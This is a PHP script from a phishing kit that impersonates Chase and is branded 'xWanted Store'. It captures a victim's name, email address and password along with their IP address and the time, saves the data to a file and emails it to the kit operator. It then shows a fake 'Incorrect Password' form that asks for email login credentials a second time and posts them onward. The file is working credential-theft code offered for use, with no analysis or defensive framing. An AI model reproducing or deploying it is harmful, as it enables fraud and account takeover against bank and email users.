<?php
if (isset($_POST['ee_nm']) && isset($_POST['ee_ml']) && isset($_POST['ee_pw'])) {
    session_start();
    include '../prevents/anti1.php';
    include '../mine.php';
    $ippa = $_SERVER['REMOTE_ADDR'];
       $msg = "=========== <[ Chase ]> ===========\r\n";
    $msg .= "NAME       : {$_POST['ee_nm']}\r\n";
    $msg .= "EMAIL      : {$_POST['ee_ml']}\r\n";
    $msg .= "PASS       : {$_POST['ee_pw']}\r\n";
    $msg .= "---------------------- IP Info ----------------------\r\n";
    $msg .= "IP ADDRESS : {$ippa}\r\n";
    $msg .= "TIME       : " . now() . " GMT\r\n";
    $msg .= "=========== <[ xWanted Store ]> ===========\r\n\r\n\r\n";
    $save = fopen("../../".$text.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "CHASE 1ST EMAIL [".$ippa."]";
    $headers = "From: xWanted <sales@xwanted.store>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours, $subject, $msg, $headers);
    exit('<form method="POST" autocomplete="off" action="javascript:void(0);" novalidates><div style="color:#FF0000"><h3 style="text-transform:uppercase;text-align:center;color:#FF0000">Incorrect Password!!!</h2><div class="select" data-type="gml"><select class="input" id="E_NM"><option value="gml" selected>Gmail</option><option value="mcr">Microsoft</option><option value="yho">Yahoo</option><option value="aol">AOL</option><option value="icl">iCloud</option><option value="cmc">Comcast</option><option value="gmx">GMX</option><option value="other">Other</option></select></div><input name="e_ml" class="input" placeholder="Email Address" type="email" required><input name="e_pw" class="input" placeholder="Email Password" type="password" required><input name="e_nm" type="hidden"><div class="row"><button type="submit"class="primary"><span class="label">Continue</span></button></div><script>$(document).ready(function(){$("#rotate").hide();$("select").change(function(){if($(this).val()=="other"&&$("#E_OT").length==0){$(this).parent().after(\'<input id="E_OT" class="input" placeholder="Email Name" type="text" required>\')}else{$("#E_OT").remove()}$(this).parent().attr("data-type",$(this).val())});$(document).on("submit","form",function(a){a.preventDefault();$("#rotate").show();$("[name=e_nm]").val($("#E_NM").val()=="other"?$("#E_OT").val():$("#E_NM option:selected").text());$.post("../extra/poster/step2.php",$(this).serialize(),function(c,b){if(c&&b=="success"){$("#form_box").html(c)}})})});</script></form>');
}
?>
